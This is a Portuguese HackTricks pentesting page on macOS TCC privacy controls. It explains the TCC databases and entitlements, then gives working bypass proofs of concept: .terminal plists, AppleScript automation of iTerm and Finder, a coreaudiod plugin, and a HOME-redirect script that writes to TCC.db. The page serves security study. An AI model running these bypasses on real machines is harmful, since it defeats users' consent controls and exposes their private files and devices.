# macOS TCC

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## **Informações Básicas**

**TCC (Transparência, Consentimento e Controle)** é um mecanismo no macOS para **limitar e controlar o acesso de aplicativos a determinados recursos**, geralmente do ponto de vista da privacidade. Isso pode incluir coisas como serviços de localização, contatos, fotos, microfone, câmera, acessibilidade, acesso total ao disco e muito mais.

Do ponto de vista do usuário, o TCC entra em ação **quando um aplicativo deseja acessar um dos recursos protegidos pelo TCC**. Quando isso acontece, o **usuário é solicitado** com uma caixa de diálogo perguntando se deseja permitir o acesso ou não.

Também é possível **conceder acesso a aplicativos** a arquivos por **intenções explícitas** dos usuários, por exemplo, quando um usuário **arrasta e solta um arquivo em um programa** (obviamente, o programa deve ter acesso a ele).

![Um exemplo de uma solicitação TCC](https://rainforest.engineering/images/posts/macos-tcc/tcc-prompt.png?1620047855)

**TCC** é tratado pelo **daemon** localizado em `/System/Library/PrivateFrameworks/TCC.framework/Resources/tccd` configurado em `/System/Library/LaunchDaemons/com.apple.tccd.system.plist` (registrando o serviço mach `com.apple.tccd.system`).

Existe um **tccd de modo de usuário** em execução por usuário conectado definido em `/System/Library/LaunchAgents/com.apple.tccd.plist` registrando os serviços mach `com.apple.tccd` e `com.apple.usernotifications.delegate.com.apple.tccd`.

As permissões são **herdadas do aplicativo pai** e as **permissões** são **rastreadas** com base no **ID do pacote** e no **ID do desenvolvedor**.

### Banco de Dados TCC

As seleções são então armazenadas no banco de dados do sistema TCC em **`/Library/Application Support/com.apple.TCC/TCC.db`** ou em **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`** para preferências por usuário. O banco de dados é **protegido contra edição com SIP** (Proteção de Integridade do Sistema), mas você pode lê-los concedendo **acesso total ao disco**.

{% hint style="info" %}
A **interface do centro de notificações** pode fazer **alterações no banco de dados do TCC do sistema**:

{% code overflow="wrap" %}
```bash
codesign -dv --entitlements :- /System/Library/PrivateFrameworks/TCC.framework/Support/tccd
[..]
com.apple.private.tcc.manager
com.apple.rootless.storage.TCC
```
{% endcode %}

No entanto, os usuários podem **excluir ou consultar regras** com a utilidade de linha de comando **`tccutil`**.
{% endhint %}

{% tabs %}
{% tab title="user DB" %}
```bash
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```
{% endtab %}

Você pode encontrar a lista completa de aplicativos que possuem permissões TCC no banco de dados do sistema. Para acessar o banco de dados, execute o seguinte comando:

```bash
sudo sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db
```

Em seguida, você pode executar a seguinte consulta SQL para obter a lista de aplicativos e suas permissões:

```sql
SELECT service, client, allowed FROM access;
```
```bash
sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .schema
# Tables: admin, policies, active_policy, access, access_overrides, expired, active_policy_id
# The table access contains the permissions per services
sqlite> select service, client, auth_value, auth_reason from access;
kTCCServiceLiverpool|com.apple.syncdefaultsd|2|4
kTCCServiceSystemPolicyDownloadsFolder|com.tinyspeck.slackmacgap|2|2
kTCCServiceMicrophone|us.zoom.xos|2|2
[...]

# Check user approved permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=2;
# Check user denied permissions for telegram
sqlite> select * from access where client LIKE "%telegram%" and auth_value=0;
```
{% endtab %}
{% endtabs %}

{% hint style="success" %}
Ao verificar ambos os bancos de dados, você pode verificar as permissões que um aplicativo permitiu, proibiu ou não tem (ele pedirá).
{% endhint %}

* O **`auth_value`** pode ter valores diferentes: negado(0), desconhecido(1), permitido(2) ou limitado(3).
* O **`auth_reason`** pode ter os seguintes valores: Erro(1), Consentimento do usuário(2), Configuração do usuário(3), Configuração do sistema(4), Política de serviço(5), Política MDM(6), Política de substituição(7), String de uso ausente(8), Tempo limite de prompt(9), Preflight desconhecido(10), Com direito(11), Política de tipo de aplicativo(12).
* Para obter mais informações sobre os **outros campos** da tabela, [**verifique esta postagem no blog**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive).

{% hint style="info" %}
Algumas permissões do TCC são: kTCCServiceAppleEvents, kTCCServiceCalendar, kTCCServicePhotos... Não há uma lista pública que defina todas elas, mas você pode verificar esta [**lista de conhecidas**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive#service).
{% endhint %}

Você também pode verificar as **permissões já concedidas** aos aplicativos em `Preferências do Sistema --> Segurança e Privacidade --> Privacidade --> Arquivos e Pastas`.

### Verificações de assinatura do TCC

O **banco de dados** do TCC armazena o **Bundle ID** do aplicativo, mas também **armazena informações** sobre a **assinatura** para **garantir** que o aplicativo que solicita o uso de uma permissão seja o correto.
```bash
# From sqlite
sqlite> select hex(csreq) from access where client="ru.keepcoder.Telegram";
#Get csreq

# From bash
echo FADE0C00000000CC000000010000000600000007000000060000000F0000000E000000000000000A2A864886F763640601090000000000000000000600000006000000060000000F0000000E000000010000000A2A864886F763640602060000000000000000000E000000000000000A2A864886F7636406010D0000000000000000000B000000000000000A7375626A6563742E4F550000000000010000000A364E33385657533542580000000000020000001572752E6B656570636F6465722E54656C656772616D000000 | xxd -r -p - > /tmp/telegram_csreq.bin
## Get signature checks
csreq -t -r /tmp/telegram_csreq.bin
(anchor apple generic and certificate leaf[field.1.2.840.113635.100.6.1.9] /* exists */ or anchor apple generic and certificate 1[field.1.2.840.113635.100.6.2.6] /* exists */ and certificate leaf[field.1.2.840.113635.100.6.1.13] /* exists */ and certificate leaf[subject.OU] = "6N38VWS5BX") and identifier "ru.keepcoder.Telegram"

```
{% endcode %}

### Entitlements

Os aplicativos **não apenas precisam** solicitar e ter sido **concedido acesso** a alguns recursos, eles também precisam **ter as permissões relevantes**.\
Por exemplo, o **Telegram** tem a permissão `com.apple.security.device.camera` para solicitar **acesso à câmera**. Um **aplicativo** que **não tenha** essa **permissão não poderá** acessar a câmera (e o usuário nem mesmo será solicitado a conceder as permissões).

No entanto, para que os aplicativos tenham **acesso a determinadas pastas do usuário**, como `~/Desktop`, `~/Downloads` e `~/Documents`, eles **não precisam** ter nenhuma **permissão específica**. O sistema lidará com o acesso de forma transparente e **solicitará permissão ao usuário** conforme necessário.

Os aplicativos da Apple **não gerarão prompts**. Eles contêm **direitos pré-concedidos** em sua lista de **permissões**, o que significa que eles **nunca gerarão um pop-up**, **nem** aparecerão em nenhum dos **bancos de dados do TCC**. Por exemplo:
```bash
codesign -dv --entitlements :- /System/Applications/Calendar.app
[...]
<key>com.apple.private.tcc.allow</key>
<array>
    <string>kTCCServiceReminders</string>
    <string>kTCCServiceCalendar</string>
    <string>kTCCServiceAddressBook</string>
</array>
```
Isso evitará que o Calendário solicite ao usuário acesso a lembretes, calendário e lista de endereços.

### Locais sensíveis desprotegidos

* $HOME (ele mesmo)
* $HOME/.ssh, $HOME/.aws, etc
* /tmp

### Intenção do usuário / com.apple.macl

Como mencionado anteriormente, é possível **conceder acesso a um aplicativo a um arquivo arrastando-o e soltando-o nele**. Esse acesso não será especificado em nenhum banco de dados TCC, mas como um **atributo estendido do arquivo**. Esse atributo irá **armazenar o UUID** do aplicativo permitido:
```bash
xattr Desktop/private.txt
com.apple.macl

# Check extra access to the file
## Script from https://gist.githubusercontent.com/brunerd/8bbf9ba66b2a7787e1a6658816f3ad3b/raw/34cabe2751fb487dc7c3de544d1eb4be04701ac5/maclTrack.command
macl_read Desktop/private.txt
Filename,Header,App UUID
"Desktop/private.txt",0300,769FD8F1-90E0-3206-808C-A8947BEBD6C3

# Get the UUID of the app
otool -l /System/Applications/Utilities/Terminal.app/Contents/MacOS/Terminal| grep uuid
    uuid 769FD8F1-90E0-3206-808C-A8947BEBD6C3
```
{% hint style="info" %}
É curioso que o atributo **`com.apple.macl`** seja gerenciado pelo **Sandbox**, não pelo tccd
{% endhint %}

O atributo estendido `com.apple.macl` **não pode ser apagado** como outros atributos estendidos porque é **protegido pelo SIP**. No entanto, como [**explicado neste post**](https://www.brunerd.com/blog/2020/01/07/track-and-tackle-com-apple-macl/), é possível desabilitá-lo **compactando** o arquivo, **apagando-o** e **descompactando-o**.

## Bypasses

### Bypass de Escrita

Isso não é um bypass, é apenas como o TCC funciona: **Ele não protege contra escrita**. Se o Terminal **não tiver acesso para ler a Área de Trabalho de um usuário, ainda pode escrever nela**:
```shell-session
username@hostname ~ % ls Desktop 
ls: Desktop: Operation not permitted
username@hostname ~ % echo asd > Desktop/lalala
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % cat Desktop/lalala
asd
```
O atributo estendido `com.apple.macl` é adicionado ao novo arquivo para dar acesso ao aplicativo criador para lê-lo.

### Bypass SSH

Por padrão, o acesso via SSH terá "Acesso total ao disco". Para desativar isso, você precisa tê-lo listado, mas desativado (removê-lo da lista não removerá esses privilégios):

![](<../../../../.gitbook/assets/image (569).png>)

Aqui você pode encontrar exemplos de como alguns malwares conseguiram contornar essa proteção:

* [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)

### Bypass Electron

O código JS de um aplicativo Electron não é assinado, então um invasor poderia mover o aplicativo para um local gravável, injetar código JS malicioso e lançar esse aplicativo e abusar das permissões do TCC.

O Electron está trabalhando na chave **`ElectronAsarIntegrity`** em Info.plist que conterá um hash do arquivo app.asar para verificar a integridade do código JS antes de executá-lo.

### Scripts do Terminal

É bastante comum dar acesso total ao disco (FDA) ao terminal, pelo menos em computadores usados por pessoas de tecnologia. E é possível invocar scripts **`.terminal`** usando-o.

Os scripts **`.terminal`** são arquivos plist como este com o comando a ser executado na chave **`CommandString`**:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
    <key>CommandString</key>
    <string>cp ~/Desktop/private.txt /tmp/;</string>
    <key>ProfileCurrentVersion</key>
    <real>2.0600000000000001</real>
    <key>RunCommandAsShell</key>
    <false/>
    <key>name</key>
    <string>exploit</string>
    <key>type</key>
    <string>Window Settings</string>
</dict>
</plist>
```
Uma aplicação poderia escrever um script de terminal em um local como /tmp e executá-lo com um comando como:
```objectivec
// Write plist in /tmp/tcc.terminal
[...]
NSTask *task = [[NSTask alloc] init];
NSString * exploit_location = @"/tmp/tcc.terminal";
task.launchPath = @"/usr/bin/open";
task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
exploit_location]; task.standardOutput = pipe;
[task launch];
```
### kTCCServiceAppleEvents / Automação

Um aplicativo com a permissão **`kTCCServiceAppleEvents`** será capaz de **controlar outros aplicativos**. Isso significa que ele poderá **abusar das permissões concedidas aos outros aplicativos**.

Para obter mais informações sobre Scripts da Apple, consulte:

{% content-ref url="macos-apple-scripts.md" %}
[macos-apple-scripts.md](macos-apple-scripts.md)
{% endcontent-ref %}

Por exemplo, se um aplicativo tiver **permissão de Automação sobre o `iTerm`**, como neste exemplo em que o **`Terminal`** tem acesso ao iTerm:

<figure><img src="../../../../.gitbook/assets/image (2) (2) (1).png" alt=""><figcaption></figcaption></figure>

#### Sobre o iTerm

O Terminal, que não tem FDA, pode chamar o iTerm, que tem, e usá-lo para executar ações:

{% code title="iterm.script" %}
```applescript
tell application "iTerm"
    activate
    tell current window
        create tab with default profile
    end tell
    tell current session of current window
        write text "cp ~/Desktop/private.txt /tmp"
    end tell
end tell
```
{% endcode %} (This tag should not be translated)
```bash
osascript iterm.script
```
#### Sobre o Finder

Ou se um aplicativo tem acesso sobre o Finder, ele pode executar um script como este:
```applescript
set a_user to do shell script "logname"
tell application "Finder"
set desc to path to home folder
set copyFile to duplicate (item "private.txt" of folder "Desktop" of folder a_user of item "Users" of disk of home) to folder desc with replacing
set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alias)) as text
end tell
do shell script "rm " & POSIX path of (copyFile as alias)
```
### Abuso de Processo

Se você conseguir **injetar código em um processo**, poderá abusar das permissões do TCC desse processo. 

Verifique as técnicas de abuso de processo na seguinte página:

{% content-ref url="../../macos-proces-abuse/" %}
[macos-proces-abuse](../../macos-proces-abuse/)
{% endcontent-ref %}

Veja alguns exemplos nas seguintes seções:

### CVE-2020-29621 - Coreaudiod

O binário **`/usr/sbin/coreaudiod`** tinha as permissões `com.apple.security.cs.disable-library-validation` e `com.apple.private.tcc.manager`. O primeiro **permite a injeção de código** e o segundo dá acesso para **gerenciar o TCC**.

Este binário permitia carregar **plug-ins de terceiros** da pasta `/Library/Audio/Plug-Ins/HAL`. Portanto, era possível **carregar um plug-in e abusar das permissões do TCC** com este PoC:
```objectivec
#import <Foundation/Foundation.h>
#import <Security/Security.h>

extern void TCCAccessSetForBundleIdAndCodeRequirement(CFStringRef TCCAccessCheckType, CFStringRef bundleID, CFDataRef requirement, CFBooleanRef giveAccess);

void add_tcc_entry() {
    CFStringRef TCCAccessCheckType = CFSTR("kTCCServiceSystemPolicyAllFiles");
    
    CFStringRef bundleID = CFSTR("com.apple.Terminal");
    CFStringRef pureReq = CFSTR("identifier \"com.apple.Terminal\" and anchor apple");
    SecRequirementRef requirement = NULL;
    SecRequirementCreateWithString(pureReq, kSecCSDefaultFlags, &requirement);
    CFDataRef requirementData = NULL;
    SecRequirementCopyData(requirement, kSecCSDefaultFlags, &requirementData);
    
    TCCAccessSetForBundleIdAndCodeRequirement(TCCAccessCheckType, bundleID, requirementData, kCFBooleanTrue);
}

__attribute__((constructor)) static void constructor(int argc, const char **argv) {
    
    add_tcc_entry();
    
    NSLog(@"[+] Exploitation finished...");
    exit(0);
```
### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>

O daemon **tccd** do usuário está usando a variável de ambiente **`HOME`** para acessar o banco de dados de usuários do TCC em: **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**

De acordo com [esta postagem do Stack Exchange](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686) e porque o daemon TCC está sendo executado via `launchd` dentro do domínio do usuário atual, é possível **controlar todas as variáveis de ambiente** passadas para ele.\
Assim, um **atacante poderia definir a variável de ambiente `$HOME`** em **`launchctl`** para apontar para um **diretório controlado**, **reiniciar** o **daemon TCC** e, em seguida, **modificar diretamente o banco de dados do TCC** para dar a si mesmo **todas as permissões do TCC disponíveis** sem nunca solicitar ao usuário final.\
PoC:
```bash
# reset database just in case (no cheating!)
$> tccutil reset All
# mimic TCC's directory structure from ~/Library
$> mkdir -p "/tmp/tccbypass/Library/Application Support/com.apple.TCC"
# cd into the new directory
$> cd "/tmp/tccbypass/Library/Application Support/com.apple.TCC/"                     
# set launchd $HOME to this temporary directory
$> launchctl setenv HOME /tmp/tccbypass
# restart the TCC daemon
$> launchctl stop com.apple.tccd && launchctl start com.apple.tccd
# print out contents of TCC database and then give Terminal access to Documents
$> sqlite3 TCC.db .dump                                                               
$> sqlite3 TCC.db "INSERT INTO access
                   VALUES('kTCCServiceSystemPolicyDocumentsFolder',
                   'com.apple.Terminal', 0, 1, 1,
X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',
                   NULL,
                   NULL,
                   'UNUSED',
                   NULL,
                   NULL,
                   1333333333333337);"
# list Documents directory without prompting the end user
$> ls ~/Documents
```
### CVE-2023-26818 - Telegram

O Telegram tinha as permissões `com.apple.security.cs.allow-dyld-environment-variables` e `com.apple.security.cs.disable-library-validation`, então era possível abusar dele para **obter acesso às suas permissões**, como gravar com a câmera. Você pode [**encontrar o payload no writeup**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/).

## Referências

* [**https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive**](https://www.rainforestqa.com/blog/macos-tcc-db-deep-dive)
* [**https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/)
* [**https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8**](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
* [**https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/**](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
